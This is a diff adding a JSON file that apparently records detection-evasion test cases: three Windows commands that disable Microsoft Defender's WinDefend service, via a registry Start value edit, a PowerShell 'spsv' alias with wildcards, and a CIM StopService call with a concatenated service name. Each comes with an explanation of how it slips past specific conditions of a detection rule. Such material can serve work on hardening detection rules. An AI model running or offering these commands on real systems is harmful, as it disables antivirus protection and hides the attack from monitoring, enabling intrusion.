@@ -1,0 +1,14 @@
+[
+  {
+    "output": "reg add \"HKLM\\System\\CurrentControlSet\\Services\\WinDefend\" /v Start /t REG_DWORD /d 4 /f",
+    "explanation": "Bypasses the rule entirely because 'reg.exe' is not included in the selection_tools_img list. Furthermore, the command line modifies the service state directly in the registry, avoiding tracked CLI keywords like 'stop', 'delete', or 'config start=disabled'."
+  },
+  {
+    "output": "powershell.exe -c \"spsv -Name W*Defen*\"",
+    "explanation": "Uses a monitored tool ('powershell.exe') but evades the selection_tools_cli condition by using the built-in alias 'spsv' instead of 'Stop-Service ' or ' stop '. It also evades the selection_services condition by using wildcards ('W*Defen*') so the exact string 'WinDefend' never appears in the command line."
+  },
+  {
+    "output": "powershell.exe -c \"$svc='Win'+'Defend'; (Get-CimInstance -ClassName Win32_Service -Filter \\\"Name='$svc'\\\").InvokeMethod('StopService', $null)\"",
+    "explanation": "Bypasses the selection_tools_cli by using CIM instance method invocation instead of '.delete()' or 'Stop-Service'. It bypasses the selection_services string matching by dynamically concatenating the targeted service name."
+  }
+]
